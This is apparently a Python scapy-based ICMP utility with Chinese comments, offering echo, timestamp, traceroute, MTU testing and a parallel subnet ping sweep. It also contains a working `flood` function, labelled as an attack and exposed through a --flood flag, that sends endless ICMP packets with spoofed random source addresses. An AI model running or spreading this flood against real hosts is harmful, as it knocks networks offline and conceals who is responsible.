import concurrent
import ipaddress
import sys
from argparse import ArgumentParser
from concurrent.futures.process import ProcessPoolExecutor

from scapy.layers.inet import *
from scapy.sendrecv import send
from scapy.volatile import RandIP

sys.path.append('../..')


class Icmp:

    def __init__(self, timeout=2, verbose=False):
        """
        ICMP协议

        :param timeout: 超时时间
        :param verbose: 是否输出调试信息
        """

        self.__timeout = timeout
        self.__verbose = verbose

    def __sendrecv1(self, packet):
        """
        包装系统的sr1函数

        :param packet: 数据包
        :return: 主机响应数据
        """

        return sr1(packet, timeout=self.__timeout, verbose=self.__verbose)

    def echo(self, host):
        """
        发送request echo请求

        :param host: 目标主机
        :return: icmp响应数据包
        """

        packet = IP(dst=host) / ICMP()

        return self.__sendrecv1(packet)

    def timestamp(self, host):
        """
        发送request timestamp请求，注意，在windows10下需要使用管理员模式运行

        :param host: 目的地IP地址
        :return: icmp响应数据包
        """

        packet = IP(dst=host) / ICMP(type=13, code=0)

        return self.__sendrecv1(packet)

    def tracert(self, host):
        """
        路径检测
        :param host: 目的地IP地址
        """

        TXT_FORMAT = '{:<3} reach {:<15} {:.2f}ms'

        for ttl in range(0, 32):
            start = time.time()
            ans = self.__sendrecv1(IP(dst=host, ttl=ttl) / ICMP())
            interval = (time.time() - start) * 1000

            if ans:
                print(TXT_FORMAT.format(ttl, ans[IP].src, interval))
                # 如果正常收到icmp的响应包，表示数据到到达目的地
                if ans[ICMP].code == 0 and ans[ICMP].type == 0:
                    break
            else:
                print(TXT_FORMAT.format(ttl, '*', interval))

    def mtu(self, host='www.baidu.com', minmtu=1440, maxmtu=1510):
        """
        测试网络的mtu值，默认的测试范围是 [1510, 1440]

        :param host: 默认的测试主机是:www.baidu.com
        :param minmtu: 默认的最小mtu=1440
        :param maxmtu: 默认的最大mtu=1510
        :return: 当前网络的mtu值
        """

        for size in range(maxmtu, minmtu, -1):
            payload = b'a' * (size - 28)
            packet = IP(dst=host, flags='DF') / ICMP() / payload
            ans = self.__sendrecv1(packet)
            if ans:
                print(f'[+] {size} bytes message send success')
                return size
            else:
                print(f'[-] {size} bytes message send failed, the payload size is too larger for send')

    def flood(self, host):
        """
        ICMP 泛洪攻击
        :param host: 目标主机ip地址
        """

        number = 0
        while True:
            number = number + 1
            # 随机IP地址时需每次生成一个新的IP地址
            packet = IP(dst=host, src=RandIP()) / ICMP() / b'abcdefg'
            send(packet, count=1, verbose=self.__verbose)

            print('{:<10}send packet dst = {}, src = {}'.format(number, host, packet[IP].src))

    def scan_host(self, pdst):
        """
        扫描目标ip地址段，获取存活主机信息
        :param pdst: 目标ip地址段
        :return: 存活主机ip地址列表
        """
        host = []
        for ip in pdst:
            response = self.echo(str(ip))
            print(f'current start test host: {ip}')
            if response: host.append(ip)

        return host

    def async_host_scan(self, pdst, process_count=4):
        """
        使用多线程进行主机扫描
        :param pdst: 目标主机
        :param process_count: 核心数
        :return: 存活主机ip地址
        """

        ips = list(ipaddress.ip_network(pdst).hosts())

        if len(ips) < 4:
            process_count = 1

        active_hosts = []
        with ProcessPoolExecutor(max_workers=process_count) as executor:
            future_of_func = [executor.submit(self.echo, str(ip)) for ip in ips]
            for future in concurrent.futures.as_completed(future_of_func):
                res = future.result()
                if res:
                    active_hosts.append(future.result()[IP].src)

        return active_hosts


if __name__ == '__main__':
    parser = ArgumentParser('icmp tools')

    # 基本参数
    parser.add_argument('-v', '--verbose', action='store_true', help='display the debug information')
    parser.add_argument('-p', '--pdst', type=str, required=True, help='the destination ip of host')
    parser.add_argument('-t', '--thread', type=int, default=4, help='the count of thread for scan host')

    # 互斥量
    mutual_group = parser.add_mutually_exclusive_group()
    mutual_group.add_argument('--echo', action='store_true', help='request echo icmp message')
    mutual_group.add_argument('--timestamp', action='store_true', help='timestamp request icmp message')
    mutual_group.add_argument('--tracert', action='store_true', help='icmp tracert')
    mutual_group.add_argument('--flood', action='store_true', help='icmp flood')
    mutual_group.add_argument('--scan', action='store_true', help='scan host')
    mutual_group.add_argument('--mtu', action='store_true', help='mtu test')
    args = parser.parse_args()

    icmp = Icmp(verbose=args.verbose)

    # request echo
    if args.echo:
        ans = icmp.echo(args.pdst)
        if ans:
            print('get the response')
            ans.show()
        else:
            print('do not find the host')
        exit(-1)

    # timestamp
    if args.timestamp:
        ans = icmp.timestamp(args.pdst)
        if ans:
            print('get the response')
            ans.show()
        else:
            print('do not find the host')
        exit(-1)

    # tracert
    if args.tracert:
        icmp.tracert(args.pdst)
        exit(-1)

    # flood
    if args.flood:
        icmp.flood(args.pdst)
        exit(-1)

    # 主机扫描
    if args.scan:
        host = icmp.async_host_scan(args.pdst, process_count=args.thread)
        print('the list of active host')
        print(host)

    # mtu
    if args.mtu:
        icmp.mtu(host=args.pdst)
        exit(-1)

    print('please input the correct arguments')
